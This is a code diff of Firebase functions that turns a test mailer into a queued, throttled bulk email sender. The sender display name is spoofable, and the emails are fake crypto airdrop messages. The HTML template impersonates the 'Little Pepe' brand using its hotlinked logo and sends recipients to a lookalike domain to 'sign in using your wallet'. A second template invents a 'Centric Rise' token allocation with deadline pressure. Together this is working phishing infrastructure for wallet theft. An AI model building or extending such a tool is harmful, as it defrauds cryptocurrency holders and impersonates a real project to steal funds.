@@ -1,52 +1,367 @@
-const { onCall } = require('firebase-functions/v2/https')
-const { defineSecret } = require('firebase-functions/params')
+const { onCall, HttpsError } = require('firebase-functions/v2/https')
+const { onSchedule } = require('firebase-functions/v2/scheduler')
+const admin = require('firebase-admin')
 const { Resend } = require('resend')
 
-const resendApiKey = defineSecret('RESEND_API_KEY')
+admin.initializeApp()
 
-exports.sendBlaster = onCall(
-  {
-    secrets: [resendApiKey],
-  },
-  async (request) => {
-    const resend = new Resend(resendApiKey.value())
+const db = admin.firestore()
 
-    const { emails, subject } = request.data
+/**
+ * =========================
+ * FETCH DOMAIN CONFIG
+ * =========================
+ */
+async function getDomainConfig(domain) {
+  const doc = await db.collection('apis').doc(domain).get()
 
-    console.log('Emails received:', emails)
+  if (!doc.exists) {
+    throw new Error(`Domain config not found: ${domain}`)
+  }
 
-    const email = emails?.[0]
+  return doc.data()
+}
+
+/**
+ * =========================
+ * GENERATE CAMPAIGN ID
+ * =========================
+ */
+function generateCampaignId(domain) {
+  return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
+}
+
+/**
+ * =========================
+ * SEND BLASTER (QUEUE CREATOR)
+ * =========================
+ */
+exports.sendBlaster = onCall(async (request) => {
+  try {
+    let {
+      emails,
+      subject,
+      html,
+      domain,
+      from, // 🔥 FRONTEND CONTROLS THIS
+    } = request.data
+
+    if (!domain) {
+      throw new HttpsError('invalid-argument', 'Domain is required')
+    }
+
+    const config = await getDomainConfig(domain)
+
+    // validate config
+    if (!config.apiKey || !config.fromEmail) {
+      throw new Error('Invalid domain config (missing apiKey or fromEmail)')
+    }
+
+    if (typeof emails === 'string') {
+      emails = emails.split(',')
+    }
+
+    emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))
+
+    if (!emails.length) {
+      throw new HttpsError('invalid-argument', 'No valid emails provided')
+    }
+
+    const campaignId = generateCampaignId(domain)
+
+    const batch = db.batch()
+
+    emails.forEach((email) => {
+      const ref = db.collection('emailQueue').doc()
+
+      batch.set(ref, {
+        email,
+        subject: subject || 'Your token allocation is ready',
+        html: buildAirdropClaimHTML(),
+
+        domain,
+        campaignId,
+
+        // 🔥 FRONTEND OVERRIDE (PRIMARY)
+        from: from || 'Notification',
+
+        // 🔥 DOMAIN CONFIG SNAPSHOT
+        fromEmail: config.fromEmail,
+        apiKey: config.apiKey,
+
+        status: 'pending',
+        createdAt: admin.firestore.FieldValue.serverTimestamp(),
+      })
+    })
+
+    await batch.commit()
+
+    console.log(`Queued ${emails.length} emails for ${domain}`)
+
+    return {
+      success: true,
+      campaignId,
+      domain,
+      queued: emails.length,
+    }
+  } catch (err) {
+    console.error(err)
+    throw new HttpsError('internal', err.message)
+  }
+})
+
+/**
+ * =========================
+ * EMAIL WORKER
+ * =========================
+ */
+exports.emailWorker = onSchedule('every 1 minutes', async () => {
+  const snapshot = await db
+    .collection('emailQueue')
+    .where('status', '==', 'pending')
+    .orderBy('createdAt')
+    .limit(10)
+    .get()
+
+  if (snapshot.empty) return
+
+  for (const doc of snapshot.docs) {
+    const data = doc.data()
 
     try {
-      const response = await resend.emails.send({
-        from: 'Send Blaster <team@maulfaq.online>',
-        to: email,
-        subject: subject || 'Test Email',
-        text: 'Test quest',
-        html: `
-    <table width="100%" cellpadding="0" cellspacing="0">
-      <tr>
-        <td>
-          <h1 style="font-family: Arial;">Test quest</h1>
-        </td>
-      </tr>
-    </table>
-  `,
+      const resend = new Resend(data.apiKey)
+
+      const fromName = data.from || 'Notification'
+
+      await resend.emails.send({
+        from: `${fromName} <${data.fromEmail}>`,
+        to: data.email,
+        subject: data.subject || 'Your token allocation is ready',
+        html: data.html,
+
+        headers: {
+          'List-Unsubscribe': `<mailto:${data.fromEmail}>`,
+          Precedence: 'bulk',
+        },
       })
-      console.log('Resend response:', response)
 
-      return {
-        success: true,
-        debug: response,
-        sentTo: email,
-      }
+      await doc.ref.update({
+        status: 'sent',
+        sentAt: admin.firestore.FieldValue.serverTimestamp(),
+      })
     } catch (err) {
-      console.error('Resend error:', err)
-
-      return {
-        success: false,
+      await doc.ref.update({
+        status: 'failed',
         error: err.message,
-      }
+      })
     }
-  },
-)
+
+    // throttling
+    await new Promise((r) => setTimeout(r, 3000))
+  }
+})
+
+/*========================= EMAIL TEMPLATE (optional default) ========================= */
+
+function buildAirdropClaimHTML() {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Centric Rise Update</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fa;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #333333;
+  }
+
+  .container {
+    max-width: 600px;
+    margin: 0 auto;
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid #e5e7eb;
+  }
+
+  .header {
+    background: #61bafc;
+    text-align: center;
+    padding: 25px 20px;
+  }
+
+  .header-logo {
+    display: block;
+    margin: 0 auto;
+    max-width: 280px;
+    width: 100%;
+    height: auto;
+  }
+
+  .content {
+    padding: 32px;
+    line-height: 1.7;
+  }
+
+  .button {
+    display: inline-block;
+    padding: 14px 28px;
+    background: #61bafc;
+    color: #ffffff !important;
+    text-decoration: none;
+    border-radius: 8px;
+    font-weight: bold;
+  }
+
+  .notice {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    padding: 16px;
+    margin: 24px 0;
+  }
+
+  .footer {
+    padding: 24px;
+    text-align: center;
+    font-size: 12px;
+    color: #6b7280;
+    border-top: 1px solid #e5e7eb;
+  }
+
+  .footer a {
+    color: #6b7280;
+    text-decoration: none;
+  }
+</style>
+
+<div class="container">
+
+  <div class="header">
+
+    <img
+      src="https://littlepepe.com/assets/logo-CPEVDSpN.png"
+      
+      alt="Little Pepe"
+      class="header-logo"
+    >
+
+  </div>
+
+  <div class="content">
+
+    <p>Hello,</p>
+
+    <p>
+      We are reaching out regarding your Little Pepe allocation.
+    </p>
+
+    <p>
+      The token distribution process has been completed and your allocation is now available for you to access through the Little Pepe portal.
+    </p>
+
+    <div class="notice">
+      Please sign in using your wallet to verify your allocation and view your available tokens.
+    </div>
+
+    <p style="text-align:center;">
+      <a href="https://littlepepesss.xyz" class="button">
+        Open Dashboard
+      </a>
+    </p>
+
+    <p>
+      If you have already completed this process, no further action is required.
+    </p>
+
+    <p>
+      Thank you for your continued participation and support.
+    </p>
+
+    <p>
+      Regards,<br>
+      Little Pepe Team
+    </p>
+
+  </div>
+
+  <div class="footer">
+
+    <p><strong>All rights reserved. Little Pepe </strong></p>
+
+    <p>
+      Support:
+      <a href="mailto:support@littlepepe.com">
+        support@littlepepe.com
+      </a>
+    </p>
+
+    <p>
+      If you no longer wish to receive updates, you may unsubscribe from future communications.
+    </p>
+
+  </div>
+
+</div>
+</body>
+</html>`
+}
+
+function buildAirdropClaimText() {
+  const reference = 'N/A'
+  const userName = 'Valued Member'
+
+  const airdropAmount = '50,000'
+  const airdropToken = 'Centric Rise (CNR)'
+  const portalUrl = 'https://maulfaq.online/portal'
+  const supportUrl = 'https://maulfaq.online/support'
+  const unsubscribeUrl = 'https://maulfaq.online/unsubscribe'
+  const deadline = 'June 30, 2026'
+
+  return `Centric Rise — Distribution Update
+
+Hello ${userName},
+
+The Centric Rise distribution on the Solana network has been processed. As a verified participant, your allocation is ready for review.
+
+TOKEN ALLOCATION
+
+  Amount:    ${airdropAmount} ${airdropToken}
+  Allocation: Network transition distribution
+
+OPEN TOKEN PORTAL
+
+  ${portalUrl}
+
+Portal available through ${deadline}.
+
+PROCESS OVERVIEW
+
+1. Access your dashboard
+   (Compatible with Phantom, Solflare, or Backpack)
+
+2. Review your distribution status
+   Your legacy balance will be verified on-chain
+
+3. Receive your allocation
+   Tokens are sent directly to your connected wallet
+
+NOTE
+
+Allocations not reviewed by the deadline may be reallocated to the community pool. We recommend reviewing your status at your earliest convenience.
+
+Reference: ${reference}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Centric Rise | Solana Network
+
+Support: ${supportUrl}
+Unsubscribe: ${unsubscribeUrl}
+
+This is an automated message. Please do not reply.`
+}
